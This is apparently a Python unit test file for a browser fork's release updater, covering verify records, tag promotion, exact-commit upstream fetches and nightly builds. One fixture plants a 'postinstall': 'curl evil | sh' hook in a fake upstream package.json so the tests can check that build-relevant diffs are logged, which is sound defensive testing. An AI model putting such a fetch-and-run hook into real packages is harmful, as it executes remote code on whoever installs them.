"""The Release flow: verify records, promote, the nightly's Release build and
the Zen sync (fetch by exact commit, tag re-check, build-file summary).

  python3 -m unittest discover -s whimsy/updater/tests
"""
import json
import os
import shutil
import subprocess
import tempfile
import unittest

from _env import git, updater

PATCH_BUILD = """diff --git a/build/moz.configure/init.configure b/build/moz.configure/init.configure
--- a/build/moz.configure/init.configure
+++ b/build/moz.configure/init.configure
@@ -1 +1 @@
-old
+{}
"""
PATCH_UI = """diff --git a/browser/base/content/browser.js b/browser/base/content/browser.js
--- a/browser/base/content/browser.js
+++ b/browser/base/content/browser.js
@@ -1 +1 @@
-old
+{}
"""


def write(root, rel, text):
    path = os.path.join(root, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(text)


def surfer(zen):
    return json.dumps({"version": {"version": "150.0"},
                       "brands": {"release": {"release": {"displayVersion": zen}}}}, indent=2) + "\n"


class Fixture(unittest.TestCase):
    """A fake Zen upstream (tags 1.0b, annotated 1.1b), a Whimsy repo on 1.0b
    with main and dev, and a bare origin. Builds and publishing are fakes."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="whimsy-release-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        shutil.rmtree(updater.DATA, ignore_errors=True)
        self.zen = os.path.join(self.tmp, "zen")
        self.repo = os.path.join(self.tmp, "whimsy")
        self.origin = os.path.join(self.tmp, "origin.git")
        self.make_zen()
        self.make_whimsy()
        self.calls = []
        self.fail_build = None
        self.hold_after_build = False
        self.patch(updater, "config", lambda: {"repo": self.repo, "publish": True})
        self.patch(updater, "on_ac_power", lambda: True)
        self.patch(updater, "build_running", lambda: False)
        self.patch(updater, "MIN_FREE_GB", 0)
        self.patch(updater, "is_newer", lambda base, target, upstream: True)
        self.patch(updater, "ensure_engine", lambda repo: None)
        self.patch(updater, "build_and_test", self.fake_build)
        self.patch(updater, "publish_release", self.fake_publish)
        self.patch(updater, "stage", lambda app, meta, info=None: self.calls.append(("stage", meta["version"])))
        self.patch(updater, "built_app", lambda repo: "/nonexistent/Whimsy.app")
        self.patch(updater, "refresh_autoconsent", lambda repo, state: self.calls.append(("autoconsent",)))
        real_sh = updater.sh
        # npm (restore_repo's re-import) never runs in tests.
        self.patch(updater, "sh", lambda cmd, **kw: "" if isinstance(cmd, str) and cmd.startswith("npm")
                   else real_sh(cmd, **kw))

    def patch(self, obj, name, value):
        old = getattr(obj, name)
        setattr(obj, name, value)
        self.addCleanup(setattr, obj, name, old)

    # ---- fixtures ----

    def make_zen(self):
        z = self.zen
        os.makedirs(z)
        git(z, "init", "-q", "-b", "main")
        write(z, "package.json", '{\n  "scripts": {\n    "build": "surfer build"\n  }\n}\n')
        write(z, "surfer.json", surfer("1.0b"))
        write(z, "configs/common/mozconfig", "ac_add_options --enable-optimize\n")
        write(z, "src/zen/tabs.js", "// tabs v1\n")
        write(z, "src/build/moz-configure.patch", PATCH_BUILD.format("v1"))
        write(z, "src/browser/ui.patch", PATCH_UI.format("v1"))
        git(z, "add", "-A")
        git(z, "commit", "-qm", "Zen 1.0b")
        git(z, "tag", "1.0b")
        self.zen10 = git(z, "rev-parse", "HEAD")
        write(z, "package.json", '{\n  "scripts": {\n    "build": "surfer build",\n'
                                 '    "postinstall": "curl evil | sh"\n  }\n}\n')
        write(z, "surfer.json", surfer("1.1b"))
        write(z, "src/zen/tabs.js", "// tabs v2\n")
        write(z, "src/build/moz-configure.patch", PATCH_BUILD.format("v2"))
        write(z, "src/browser/ui.patch", PATCH_UI.format("v2"))
        write(z, "scripts/fetch.py", "print('hi')\n")
        git(z, "add", "-A")
        git(z, "commit", "-qm", "Zen 1.1b")
        git(z, "tag", "-a", "1.1b", "-m", "Zen 1.1b")
        self.zen11 = git(z, "rev-parse", "HEAD")

    def make_whimsy(self):
        r = self.repo
        os.makedirs(r)
        git(r, "init", "-q", "-b", "main")
        files = git(self.zen, "ls-tree", "-r", "--name-only", "1.0b").split("\n")
        for rel in files:
            write(r, rel, git(self.zen, "show", f"1.0b:{rel}") + "\n")
        write(r, "whimsy/upstream-files.txt", "\n".join(files) + "\n")
        write(r, "whimsy/upstream.json", json.dumps({"repo": "zen-browser/desktop", "tag": "1.0b",
                                                     "sha": self.zen10, "label": "1.0b"}, indent=2) + "\n")
        write(r, "whimsy/version.json", json.dumps({"zen": "1.0b", "revision": 0, "commit": None,
                                                    "history": []}, indent=2) + "\n")
        write(r, ".gitignore", ".surfer/\n")
        git(r, "add", "-A")
        git(r, "commit", "-qm", "Whimsy on Zen 1.0b")
        git(r, "branch", "dev")
        git(r, "checkout", "-q", "dev")
        self.feature("one")
        subprocess.run(["git", "init", "-q", "--bare", self.origin], check=True)
        git(r, "remote", "add", "origin", self.origin)
        git(r, "remote", "add", "upstream", "file://" + self.zen)
        git(r, "push", "-q", "origin", "main", "dev")

    def feature(self, name):
        write(self.repo, f"whimsy/feature-{name}.txt", name + "\n")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-qm", f"Feature {name}")
        return git(self.repo, "rev-parse", "HEAD")

    def green(self, sha, **overrides):
        """Record a green full verify of a clean build of `sha`."""
        records = updater._read_record(self.repo, "verified.json", {})
        records[sha] = dict({"mode": "all", "status": 0, "dirty": False, "at": "now", "built_commit": sha,
                             "build_dirty": False}, **overrides)
        updater._write_record(self.repo, "verified.json", records)

    def tag_release(self, sha):
        git(self.repo, "tag", "-a", "-f", "-m", "release", "release", sha)

    def fake_build(self, repo):
        self.calls.append(("build", git(repo, "rev-parse", "--abbrev-ref", "HEAD"), git(repo, "rev-parse", "HEAD")))
        if self.fail_build:
            raise RuntimeError(self.fail_build)
        if self.hold_after_build:
            updater.update_control(hold=True)

    def fake_publish(self, repo):
        self.calls.append(("publish", git(repo, "rev-parse", "--abbrev-ref", "HEAD")))
        # Like publish.py: a version commit on main.
        with open(os.path.join(repo, "whimsy", "version.json")) as f:
            data = json.load(f)
        data["revision"] += 1
        data["commit"] = git(repo, "rev-parse", "HEAD")
        write(repo, "whimsy/version.json", json.dumps(data, indent=2) + "\n")
        git(repo, "commit", "-qam", f"Whimsy {data['revision']}")

    def state(self):
        return updater.read_json("state.json", {})

    def log_text(self):
        try:
            with open(updater.LOG) as f:
                return f.read()
        except OSError:
            return ""

    def kinds(self):
        return [c[0] for c in self.calls]


class VerifyRecords(Fixture):
    def test_full_green_clean_build_of_the_commit_counts(self):
        sha = git(self.repo, "rev-parse", "HEAD")
        built = updater.begin_build(self.repo)
        updater.record_build(self.repo, built)
        updater.record_verify(self.repo, "all", 0)
        self.assertIsNone(updater.verified_green(self.repo, sha))

    def test_quick_failed_dirty_or_stale_builds_dont_count(self):
        sha = git(self.repo, "rev-parse", "HEAD")
        updater.record_build(self.repo)
        updater.record_verify(self.repo, "quick", 0)
        self.assertIn("not a full one", updater.verified_green(self.repo, sha))
        updater.record_verify(self.repo, "gate", 1)
        self.assertIn("failed", updater.verified_green(self.repo, sha))
        write(self.repo, "whimsy/feature-one.txt", "edited\n")
        updater.record_verify(self.repo, "all", 0)
        self.assertIn("uncommitted", updater.verified_green(self.repo, sha))
        git(self.repo, "checkout", "-q", "--", ".")
        newer = self.feature("two")  # built one, verified the next
        updater.record_verify(self.repo, "all", 0)
        self.assertIn("wasn't built from it", updater.verified_green(self.repo, newer))
        self.assertIn("no verify", updater.verified_green(self.repo, "0" * 40))

    def test_a_failed_build_leaves_no_build_record(self):
        updater.record_build(self.repo)
        updater.begin_build(self.repo)  # the build then fails: nothing recorded
        updater.record_verify(self.repo, "all", 0)
        sha = git(self.repo, "rev-parse", "HEAD")
        self.assertIn("wasn't built from it", updater.verified_green(self.repo, sha))

    def test_verify_sh_records_through_the_cli(self):
        # verify.sh calls `updater.py record-verify <mode> <status>`.
        sha = git(self.repo, "rev-parse", "HEAD")
        updater.record_build(self.repo)
        self.patch(updater, "__file__", os.path.join(self.repo, "whimsy", "updater", "updater.py"))
        updater.cmd_record("verify", ["gate", "0"])
        self.assertIsNone(updater.verified_green(self.repo, sha))


class Promote(Fixture):
    def promote(self, *args):
        self.patch(updater, "__file__", os.path.join(self.repo, "whimsy", "updater", "updater.py"))
        updater.cmd_promote(list(args))

    def remote_tag(self):
        out = git(self.repo, "ls-remote", "origin", "refs/tags/release^{}")
        return out.split("\t")[0] if out else None

    def test_refuses_an_unverified_commit(self):
        with self.assertRaises(SystemExit) as e:
            self.promote()
        self.assertIn("can't be released", str(e.exception))
        self.assertIsNone(updater.release_commit(self.repo))
        self.assertIsNone(self.remote_tag())

    def test_moves_an_annotated_tag_to_dev_head_and_pushes_it(self):
        head = git(self.repo, "rev-parse", "dev")
        self.green(head)
        self.promote()
        self.assertEqual(updater.release_commit(self.repo), head)
        self.assertEqual(git(self.repo, "cat-file", "-t", "release"), "tag")
        self.assertEqual(self.remote_tag(), head)
        self.assertIn("full verify (all) passed", git(self.repo, "tag", "-l", "-n9", "release"))

    def test_a_named_commit_and_only_dev_commits(self):
        first = git(self.repo, "rev-parse", "dev")
        self.green(first)
        self.feature("two")
        self.promote(first[:10])
        self.assertEqual(updater.release_commit(self.repo), first)
        git(self.repo, "checkout", "-q", "-b", "side", "main")
        side = self.feature("side")
        git(self.repo, "checkout", "-q", "dev")
        self.green(side)
        with self.assertRaises(SystemExit) as e:
            self.promote(side)
        self.assertIn("isn't on dev", str(e.exception))

    def test_going_back_needs_older(self):
        old = git(self.repo, "rev-parse", "dev~1")
        new = git(self.repo, "rev-parse", "dev")
        self.green(old)
        self.green(new)
        self.promote(new)
        with self.assertRaises(SystemExit):
            self.promote(old)
        self.assertEqual(updater.release_commit(self.repo), new)
        self.promote(old, "--older")
        self.assertEqual(updater.release_commit(self.repo), old)
        self.assertEqual(self.remote_tag(), old)

    def test_a_failed_push_leaves_the_tag_where_it_was(self):
        first = git(self.repo, "rev-parse", "dev")
        self.green(first)
        self.promote()
        second = self.feature("two")
        self.green(second)
        git(self.repo, "remote", "set-url", "origin", os.path.join(self.tmp, "gone.git"))
        with self.assertRaises(SystemExit) as e:
            self.promote()
        self.assertIn("couldn't push", str(e.exception))
        self.assertEqual(updater.release_commit(self.repo), first)


class Zen(Fixture):
    def test_release_tags_peel_annotated_tags(self):
        tags = updater.release_tags(self.repo)
        self.assertEqual(tags, {"1.0b": self.zen10, "1.1b": self.zen11})

    def test_fetches_the_exact_commit(self):
        updater.fetch_zen(self.repo, "1.1b", self.zen11)
        self.assertEqual(git(self.repo, "cat-file", "-t", self.zen11), "commit")

    def test_refuses_a_tag_that_moved_since_the_check(self):
        git(self.zen, "tag", "-f", "-a", "1.1b", "-m", "moved", self.zen10)
        with self.assertRaises(RuntimeError) as e:
            updater.fetch_zen(self.repo, "1.1b", self.zen11)
        self.assertIn("refusing", str(e.exception))

    def test_refuses_a_short_or_bogus_id(self):
        with self.assertRaises(RuntimeError):
            updater.fetch_zen(self.repo, "1.1b", self.zen11[:12])

    def test_build_relevant(self):
        for path in ("package.json", "surfer.json", "configs/common/mozconfig", ".github/workflows/x.yml",
                     "scripts/x.js", "tools/ffprefs/src/main.rs", "src/foo/moz.build", "x/y.py", "a.sh",
                     ".nvmrc", "build/moz.configure/init.configure", ".husky/pre-commit"):
            self.assertTrue(updater.build_relevant(path), path)
        for path in ("src/zen/tabs.js", "prefs/zen.yaml", "locales/en-US/x.ftl", "README.md"):
            self.assertFalse(updater.build_relevant(path), path)

    def test_sync_logs_build_relevant_changes_only(self):
        git(self.repo, "checkout", "-q", "main")
        tag = updater.sync_zen(self.repo, {}, ("1.1b", self.zen11))
        self.assertEqual(tag, "1.1b")
        with open(os.path.join(self.repo, "whimsy", "upstream.json")) as f:
            self.assertEqual(json.load(f)["sha"], self.zen11)
        log = self.log_text()
        self.assertIn("M package.json", log)
        self.assertIn("A scripts/fetch.py", log)
        self.assertIn("src/build/moz-configure.patch", log)
        self.assertIn("patches build/moz.configure/init.configure", log)
        self.assertIn('postinstall": "curl evil | sh"', log)  # package.json's diff is shown
        self.assertNotIn("src/zen/tabs.js", log)
        self.assertNotIn("src/browser/ui.patch", log)


class Nightly(Fixture):
    def test_no_release_tag_skips(self):
        updater.cmd_run()
        self.assertEqual(self.state()["last_result"], "skipped")
        self.assertIn("no release tag", self.state()["message"])
        self.assertNotIn("build", self.kinds())

    def test_hold_stops_everything(self):
        self.tag_release(git(self.repo, "rev-parse", "dev"))
        updater.update_control(hold=True)
        updater.cmd_run()
        self.assertEqual(self.state()["last_result"], "skipped")
        self.assertEqual(self.calls, [])

    def test_unverified_tag_moved_by_hand_skips(self):
        self.tag_release(git(self.repo, "rev-parse", "dev"))
        updater.cmd_run()
        self.assertEqual(self.state()["last_result"], "skipped")
        self.assertIn("can't be released", self.state()["message"])
        self.assertNotIn("build", self.kinds())

    def zen_up_to_date(self):
        # Pretend Zen has nothing newer than 1.0b.
        self.patch(updater, "release_tags", lambda repo: {"1.0b": self.zen10})

    def test_tag_moved_builds_release_from_the_tag_on_main(self):
        self.zen_up_to_date()
        release = git(self.repo, "rev-parse", "dev")
        self.green(release)
        self.tag_release(release)
        later = self.feature("unreleased")  # dev moves on after the promote
        updater.cmd_run()
        builds = [c for c in self.calls if c[0] == "build"]
        self.assertEqual(len(builds), 1)
        self.assertEqual(builds[0][1], "main")
        self.assertEqual(builds[0][2], release)  # exactly the tagged commit (fast-forward)
        self.assertIn(("publish", "main"), self.calls)
        state = self.state()
        self.assertEqual(state["last_result"], "updated")
        self.assertEqual(state["release_build"]["commit"], release)
        # Unpromoted dev work never reached main; main's version commit reached dev.
        self.assertEqual(subprocess.run(["git", "merge-base", "--is-ancestor", later, "main"],
                                        cwd=self.repo).returncode, 1)
        self.assertEqual(subprocess.run(["git", "merge-base", "--is-ancestor", "main", "dev"],
                                        cwd=self.repo).returncode, 0)
        self.assertEqual(git(self.repo, "rev-parse", "--abbrev-ref", "HEAD"), "dev")
        self.assertIn("autoconsent", self.kinds())
        # The next night: nothing moved, nothing builds.
        self.calls.clear()
        updater.cmd_run()
        self.assertEqual(self.state()["last_result"], "up-to-date")
        self.assertNotIn("build", self.kinds())
        self.assertEqual(git(self.repo, "rev-parse", "--abbrev-ref", "HEAD"), "dev")

    def test_zen_newer_alone_builds_merges_and_merges_back(self):
        release = git(self.repo, "rev-parse", "dev")
        self.green(release)
        self.tag_release(release)
        self.patch(updater, "release_tags", lambda repo: {"1.0b": self.zen10})
        updater.cmd_run()  # the first Release build
        self.calls.clear()
        self.patch(updater, "release_tags", lambda repo: {"1.0b": self.zen10, "1.1b": self.zen11})
        updater.cmd_run()  # only Zen is new
        self.assertEqual([c[0] for c in self.calls if c[0] in ("build", "publish")], ["build", "publish"])
        self.assertEqual(self.state()["release_build"]["zen"], "1.1b")
        dev_upstream = json.loads(git(self.repo, "show", "dev:whimsy/upstream.json"))
        self.assertEqual(dev_upstream["sha"], self.zen11)  # merged back into dev
        self.assertIn("Zen 1.1b: ", self.log_text())
        self.assertIn("build-relevant file(s) changed", self.log_text())

    def test_hold_set_during_the_build_stops_publishing(self):
        self.zen_up_to_date()
        release = git(self.repo, "rev-parse", "dev")
        self.green(release)
        self.tag_release(release)
        self.hold_after_build = True
        updater.cmd_run()
        self.assertIn("build", self.kinds())
        self.assertNotIn("publish", self.kinds())
        self.assertNotIn("release_build", self.state())
        self.assertIn("hold was set", self.log_text())

    def test_failed_build_restores_branches_and_skips_after_two(self):
        self.zen_up_to_date()
        release = git(self.repo, "rev-parse", "dev")
        self.green(release)
        self.tag_release(release)
        main_before = git(self.repo, "rev-parse", "main")
        dev_before = git(self.repo, "rev-parse", "dev")
        self.fail_build = "a test failed"
        updater.cmd_run()
        state = self.state()
        self.assertEqual(state["last_result"], "failed")
        self.assertIn("Will try again", state["message"])
        self.assertEqual(git(self.repo, "rev-parse", "main"), main_before)
        self.assertEqual(git(self.repo, "rev-parse", "dev"), dev_before)
        self.assertEqual(git(self.repo, "rev-parse", "--abbrev-ref", "HEAD"), "dev")
        updater.cmd_run()
        self.assertEqual(self.state()["skip_release"], release)
        self.calls.clear()
        updater.cmd_run()  # skipped until the tag moves
        self.assertNotIn("build", self.kinds())
        newer = self.feature("fix")
        self.green(newer)
        self.tag_release(newer)
        self.fail_build = None
        updater.cmd_run()
        self.assertIn("build", self.kinds())
        self.assertEqual(self.state()["release_build"]["commit"], newer)

    def test_zen_tag_moving_mid_run_is_refused_and_counted(self):
        release = git(self.repo, "rev-parse", "dev")
        self.green(release)
        self.tag_release(release)
        main_before = git(self.repo, "rev-parse", "main")
        seen = {"1.0b": self.zen10, "1.1b": self.zen11}
        moved = {"1.0b": self.zen10, "1.1b": self.zen10}
        answers = iter([seen, moved])
        self.patch(updater, "release_tags", lambda repo: next(answers))
        updater.cmd_run()
        state = self.state()
        self.assertEqual(state["last_result"], "failed")
        self.assertIn("refusing", state["message"])
        self.assertEqual(state["attempts"].get("1.1b"), 1)
        self.assertNotIn("build", self.kinds())
        self.assertEqual(git(self.repo, "rev-parse", "main"), main_before)

    def test_ship_never_merges_zen(self):
        calls = []
        self.patch(updater, "sync_zen", lambda *a, **k: calls.append("sync"))
        self.patch(updater, "pin_build_date", lambda: "20261031033000")
        self.patch(updater, "build_meta", lambda repo, **kw: ({"version": "x"}, {"version": "x"}))
        self.patch(updater, "cmd_apply", lambda: None)
        self.patch(updater, "config", lambda: {"repo": self.repo, "publish": False})
        real_sh = updater.sh
        self.patch(updater, "sh", lambda cmd, **kw: "" if (isinstance(cmd, str) or cmd[0] != "git")
                   else real_sh(cmd, **kw))
        updater.cmd_ship()
        self.assertEqual(calls, [])


if __name__ == "__main__":
    unittest.main()
